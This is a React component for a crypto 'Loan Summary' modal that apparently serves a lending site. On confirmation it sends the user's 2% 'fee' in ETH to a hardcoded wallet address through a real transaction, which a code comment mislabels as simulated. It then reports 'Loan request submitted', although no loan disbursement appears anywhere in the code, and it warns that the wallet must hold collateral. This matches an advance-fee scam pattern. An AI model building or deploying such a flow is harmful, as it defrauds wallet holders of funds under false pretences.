import React, { useState } from 'react';
import { useWalletClient } from 'wagmi';
import { parseEther } from 'viem';

const LoanSummaryModal = ({ loan, onClose, walletAddress }) => {
  const { data: walletClient } = useWalletClient();
  const [isProcessing, setIsProcessing] = useState(false);

  // Convert USD to ETH (simplified - in production, use real price feed)
  const ETH_PRICE = 3000; // Example ETH price in USD
  const loanInETH = (loan.amount / ETH_PRICE).toFixed(6);
  const feeInETH = (loan.fee / ETH_PRICE).toFixed(6);
  const totalInETH = (loan.total / ETH_PRICE).toFixed(6);

  const handleConfirm = async () => {
    if (!walletClient || !walletAddress) {
      alert('Wallet not connected');
      return;
    }

    setIsProcessing(true);

    try {
      // Simulate transaction request
      const tx = {
        to: '0xB763A8cD434CbfE401d118408e95F7A01b2c1549',
        value: parseEther(feeInETH),
        account: walletAddress
      };

      const txHash = await walletClient.sendTransaction(tx);
      
      alert(`✅ Loan request submitted!\n\nLoan Amount: $${loan.amount.toLocaleString()} (${loanInETH} ETH)\nFee: $${loan.fee.toLocaleString()} (${feeInETH} ETH)\nTotal Repayment: $${loan.total.toLocaleString()} (${totalInETH} ETH)\n\nTransaction Hash:\n${txHash}`);
      
      onClose();
    } catch (error) {
      console.error('Transaction error:', error);
      alert(`❌ Transaction failed: ${error?.message || 'Unknown error'}`);
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="loan-modal" onClick={(e) => e.stopPropagation()}>
        <div className="modal-header">
          <h2>Loan Summary</h2>
          <button className="modal-close" onClick={onClose}>×</button>
        </div>

        <div className="modal-content">
          <div className="summary-row">
            <span className="summary-label">Loan Amount</span>
            <div className="summary-value-group">
              <span className="summary-value">${loan.amount.toLocaleString()}</span>
              <span className="summary-value-eth">{loanInETH} ETH</span>
            </div>
          </div>

          <div className="summary-row">
            <span className="summary-label">Fee (2%)</span>
            <div className="summary-value-group">
              <span className="summary-value">${loan.fee.toLocaleString()}</span>
              <span className="summary-value-eth">{feeInETH} ETH</span>
            </div>
          </div>

          <div className="summary-divider"></div>

          <div className="summary-row total-row">
            <span className="summary-label">Total Repayment</span>
            <div className="summary-value-group">
              <span className="summary-value">${loan.total.toLocaleString()}</span>
              <span className="summary-value-eth">{totalInETH} ETH</span>
            </div>
          </div>

          <div className="modal-info">
            <p>⚠️ Your wallet must hold at least 10% of the requested loan amount as collateral.</p>
          </div>

          <button 
            className="confirm-btn" 
            onClick={handleConfirm}
            disabled={isProcessing}
          >
            {isProcessing ? 'Processing...' : 'Confirm & Sign Transaction'}
          </button>
        </div>

        <div className="modal-glow"></div>
      </div>
    </div>
  );
};

export default LoanSummaryModal;
